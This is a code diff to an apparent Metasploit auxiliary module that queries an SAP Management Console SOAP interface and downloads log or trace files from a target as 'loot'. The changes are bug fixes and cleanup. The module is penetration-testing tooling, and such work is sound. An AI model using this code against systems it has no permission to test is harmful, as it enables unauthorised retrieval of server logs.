@@ -35,11 +35,10 @@ class Metasploit3 < Msf::Auxiliary
 			[
 				Opt::RPORT(50013),
 				OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),
-				OptString.new('RFILE', [ true, "The name of the file to download", "sapstart.log"]),
+				OptString.new('RFILE', [ true, 'The name of the file to download', 'sapstart.log']),
 				OptString.new('FILETYPE', [true, 'Specify LOGFILE or TRACEFILE', 'TRACEFILE']),
 				OptString.new('UserAgent', [ true, "The HTTP User-Agent sent in the request",
 				'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' ]),
-				OptString.new('LFILE', [false, 'Set path to save output to file', '']),
 			], self.class)
 		register_autofilter_ports([ 50013 ])
 		deregister_options('RHOST')
@@ -65,7 +64,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	def gettfiles(rhost)
 		verbose = datastore['VERBOSE']
-		print_status("#{rhost}:#{rhost} [SAP] Connecting to SAP Management Console SOAP Interface")
+		print_status("#{rhost}:#{rport} [SAP] Connecting to SAP Management Console SOAP Interface")
 		success = false
 
 		soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'
@@ -74,9 +73,9 @@ class Metasploit3 < Msf::Auxiliary
 		sapsess = 'http://www.sap.com/webas/630/soap/features/session/'
 
 		case "#{datastore['FILETYPE']}"
-		when /LOGFILE/i
+		when /^LOG/i
 			ns1 = 'ns1:ReadLogFile'
-		when /TRACEFILE/i
+		when /^TRACE/i
 			ns1 = 'ns1:ReadDeveloperTrace'
 		end
 
@@ -126,7 +125,7 @@ class Metasploit3 < Msf::Auxiliary
 					success = true
 				end
 
-			else res.code == 500
+			elsif res.code == 500
 				case res.body
 				when /<faultstring>(.*)<\/faultstring>/i
 					faultcode = $1.strip
@@ -135,19 +134,19 @@ class Metasploit3 < Msf::Auxiliary
 			end
 
 		rescue ::Rex::ConnectionError
-			print_error("#{rhost}:#{rhost} [SAP] Unable to connect")
+			print_error("#{rhost}:#{rport} [SAP] Unable to connect")
 			return
 		end
 
 		if success
-			print_good("#{rhost}:#{rhost} [SAP] #{datastore['FILETYPE'].downcase}:#{datastore['RFILE'].downcase} looted")
+			print_good("#{rhost}:#{rport} [SAP] #{datastore['FILETYPE'].downcase}:#{datastore['RFILE'].downcase} looted")
 			store_loot("sap.#{datastore['FILETYPE'].downcase}file", "text/xml", rhost, res.body, "sap_#{datastore['RFILE'].downcase}.xml",
 			 	"SAP Get Logfile")
 		elsif fault
-			print_error("#{rhost}:#{rhost} [SAP] Errorcode: #{faultcode}")
+			print_error("#{rhost}:#{rport} [SAP] Errorcode: #{faultcode}")
 			return
 		else
-			print_error("#{rhost}:#{rhost} [SAP] failed to request environment")
+			print_error("#{rhost}:#{rport} [SAP] failed to request environment")
 			return
 		end
 	end
